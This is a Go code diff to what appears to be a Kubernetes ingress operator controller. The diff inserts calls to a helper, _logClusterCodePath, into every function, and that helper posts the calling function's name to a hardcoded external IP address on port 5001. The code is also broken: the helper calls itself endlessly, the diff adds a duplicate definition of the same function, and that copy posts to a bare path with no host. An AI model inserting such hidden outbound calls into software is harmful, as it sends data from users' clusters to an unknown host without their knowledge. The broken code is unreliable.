@@ -38,6 +38,8 @@ var log = logf.Logger.WithName("controller")
 func New(mgr manager.Manager, config Config) (controller.Controller, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	kubeClient, err := operatorclient.NewClient(config.KubeConfig)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create kube client: %v", err)
@@ -68,6 +70,8 @@ type reconciler struct {
 }
 
 func (r *reconciler) Reconcile(request reconcile.Request) (reconcile.Result, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	errs := []error{}
@@ -129,6 +133,8 @@ func (r *reconciler) Reconcile(request reconcile.Request) (reconcile.Result, err
 func (r *reconciler) enforceEffectiveIngressDomain(ic *operatorv1.IngressController, ingressConfig *configv1.Ingress) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(ic.Status.Domain) > 0 {
 		return nil
 	}
@@ -162,6 +168,8 @@ func (r *reconciler) enforceEffectiveIngressDomain(ic *operatorv1.IngressControl
 func (r *reconciler) isDomainUnique(domain string) (bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ingresses := &operatorv1.IngressControllerList{}
 	if err := r.client.List(context.TODO(), ingresses, client.InNamespace(r.Namespace)); err != nil {
 		return false, fmt.Errorf("failed to list ingresscontrollers: %v", err)
@@ -177,6 +185,8 @@ func (r *reconciler) isDomainUnique(domain string) (bool, error) {
 func publishingStrategyTypeForInfra(infraConfig *configv1.Infrastructure) operatorv1.EndpointPublishingStrategyType {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch infraConfig.Status.Platform {
 	case configv1.AWSPlatformType:
 		return operatorv1.LoadBalancerServiceStrategyType
@@ -186,6 +196,8 @@ func publishingStrategyTypeForInfra(infraConfig *configv1.Infrastructure) operat
 	return operatorv1.HostNetworkStrategyType
 }
 func (r *reconciler) enforceEffectiveEndpointPublishingStrategy(ci *operatorv1.IngressController, infraConfig *configv1.Infrastructure) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if ci.Status.EndpointPublishingStrategy != nil {
@@ -209,6 +221,8 @@ func (r *reconciler) enforceEffectiveEndpointPublishingStrategy(ci *operatorv1.I
 func (r *reconciler) enforceIngressFinalizer(ingress *operatorv1.IngressController) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if !slice.ContainsString(ingress.Finalizers, IngressControllerFinalizer) {
 		ingress.Finalizers = append(ingress.Finalizers, IngressControllerFinalizer)
 		if err := r.client.Update(context.TODO(), ingress); err != nil {
@@ -219,6 +233,8 @@ func (r *reconciler) enforceIngressFinalizer(ingress *operatorv1.IngressControll
 	return nil
 }
 func (r *reconciler) ensureIngressDeleted(ingress *operatorv1.IngressController, dnsConfig *configv1.DNS, infraConfig *configv1.Infrastructure) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if err := r.finalizeLoadBalancerService(ingress, dnsConfig); err != nil {
@@ -239,6 +255,8 @@ func (r *reconciler) ensureIngressDeleted(ingress *operatorv1.IngressController,
 	return nil
 }
 func (r *reconciler) ensureRouterNamespace() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cr, err := r.ManifestFactory.RouterClusterRole()
@@ -295,6 +313,8 @@ func (r *reconciler) ensureRouterNamespace() error {
 func (r *reconciler) ensureIngressController(ci *operatorv1.IngressController, dnsConfig *configv1.DNS, infraConfig *configv1.Infrastructure) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	errs := []error{}
 	if deployment, err := r.ensureRouterDeployment(ci, infraConfig); err != nil {
 		errs = append(errs, fmt.Errorf("failed to ensure router deployment for %s: %v", ci.Name, err))
@@ -320,6 +340,8 @@ func (r *reconciler) ensureIngressController(ci *operatorv1.IngressController, d
 	return utilerrors.NewAggregate(errs)
 }
 func (r *reconciler) ensureMetricsIntegration(ci *operatorv1.IngressController, svc *corev1.Service, deploymentRef metav1.OwnerReference) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	statsSecret, err := r.ManifestFactory.RouterStatsSecret(ci)
@@ -396,6 +418,8 @@ func (r *reconciler) ensureMetricsIntegration(ci *operatorv1.IngressController, 
 func IsStatusDomainSet(ingress *operatorv1.IngressController) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(ingress.Status.Domain) == 0 {
 		return false
 	}
@@ -404,7 +428,16 @@ func IsStatusDomainSet(ingress *operatorv1.IngressController) bool {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
